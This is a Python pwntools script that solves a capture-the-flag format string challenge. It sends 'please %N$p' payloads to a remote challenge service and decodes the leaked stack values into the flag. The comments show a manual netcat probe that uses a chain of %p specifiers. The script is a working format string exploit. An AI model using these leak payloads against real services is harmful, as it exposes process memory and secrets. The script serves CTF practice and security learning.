#!/usr/bin/python3

from pwn import *

def conv(hex_str):
    tmp = ''
    for i in range(len(hex_str) - 1, 0, -2):
        tmp += hex_str[i-1] + hex_str[i]
    res = bytes.fromhex(tmp).decode()
    return res

# by trial and error, we found out that the variable buffer, i.e. our input,
# is located at 6th index
#   echo 'please-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p' | nc mc.ax 31569
#   what do you say?
#   please-0x7ffc91e08ed6-0x7ffc91e08ef0-(nil)-0x1-0x7f6d3c1d0500-0x252d657361656c70-0x2d70252d70252d70-0x70252d70252d7025-0x252d70252d70252d-0x70252d70 to you too!
# 0x252d657361656c70 (little endian) -> please-%


offset = (0x200//8) + 6 # 64-bit = 8 bytes, size of buffer is 0x200, divide it by 8 and plus 6 (buffer starting point)
result = []

i = offset

while i < offset + (0x200//8):
    s = remote("mc.ax", 31569)

    payload = f"please %{i}$p"

    s.recv()

    s.sendline(payload.encode())
    
    resp = s.recv().decode()

    if resp == '\n' or "(nil)" in resp:
        pass
    else:
        result.append(resp.split()[1])
        i += 1

    if len(result) == 5:
        break

    s.close()

flag = ''

for i in result:
    flag += conv(i[2:])

print(flag)

#with open('flag.txt', 'w') as f:
#    f.write(flag)
